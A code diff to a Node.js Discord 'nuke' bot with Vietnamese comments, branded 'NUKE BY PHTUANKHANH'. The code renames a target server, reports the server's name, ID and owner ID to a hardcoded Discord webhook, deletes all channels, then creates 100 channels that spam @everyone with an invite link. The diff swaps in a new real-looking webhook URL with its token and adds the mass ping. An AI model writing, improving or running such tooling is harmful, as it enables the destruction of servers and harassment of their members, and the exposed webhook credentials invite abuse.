@@ -8,15 +8,15 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ĐÃ THAY WEBHOOK MỚI
-const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571411890234466326/-OR6ccUWj5TDjXECqADD_ZLLoDwEPHUUTRyoEKvz-x_3HGy1Zetis50n6QcwvxRUitu0';
+// WEBHOOK THÔNG BÁO
+const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
 
-// CẤU HÌNH CỐ ĐỊNH
+// CẤU HÌNH CỐ ĐỊNH (Đã fix ping @everyone ở dòng riêng)
 const CONFIG = {
   channelName: 'anh-phtuankhanh-nuke',
   renameName: 'NUKE BY PHTUANKHANH',
   channelCount: 100,
-  msgContent: '# > NUKE BY PHTUANKHANH\n\nhttps://discord.gg/BqZ7UdtwXG',
+  msgContent: '# > NUKE BY PHTUANKHANH\n\n@everyone\n\nhttps://discord.gg/BqZ7UdtwXG',
   msgCount: 1,
   pingEveryone: true
 };
@@ -62,7 +62,9 @@ async function notifyNuke(info) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body),
     });
-  } catch {}
+  } catch (e) {
+    pushLog(`Webhook error: ${e.message}`, 'error');
+  }
 }
 
 function startBot(token) {
@@ -101,18 +103,24 @@ function startBot(token) {
     try {
       const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;
 
-      // GỬI NOTIFY TRƯỚC KHI XOÁ KÊNH ĐỂ ĐẢM BẢO WEBHOOK BAY ĐƯỢC
+      // 1. RENAME GUILD
+      if (rName) {
+        pushLog(`Đang đổi tên server...`, 'info');
+        await guild.setName(rName).catch(() => {});
+      }
+
+      // 2. GỬI WEBHOOK THÔNG BÁO
       await notifyNuke({
         guildName: guild.name,
         guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
         guildId: guild.id, ownerId: guild.ownerId,
-        channels: cc, msgs: cc * mc, // Ước tính
+        channels: cc, msgs: cc * mc,
         user: botClient.user.username,
         error: null,
       });
       pushLog('Đã gửi webhook thông báo.', 'success');
 
-      // 1. XOÁ ALL KÊNH
+      // 3. XOÁ ALL KÊNH
       pushLog(`Đang xoá toàn bộ kênh...`, 'info');
       const oldChannels = await guild.channels.fetch().catch(() => null);
       if (oldChannels) {
@@ -121,7 +129,7 @@ function startBot(token) {
         );
       }
 
-      // 2. TẠO KÊNH + SPAM
+      // 4. TẠO KÊNH + SPAM
       pushLog(`Đang tạo ${cc} kênh và spam tin nhắn...`, 'info');
       const createPromises = Array.from({ length: cc }, () =>
         guild.channels.create({
@@ -139,12 +147,6 @@ function startBot(token) {
       );
 
       await Promise.allSettled(createPromises);
-
-      // 3. RENAME
-      if (rName) {
-        pushLog(`Đang đổi tên server...`, 'info');
-        await guild.setName(rName).catch(() => {});
-      }
 
       pushLog(`NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');
 
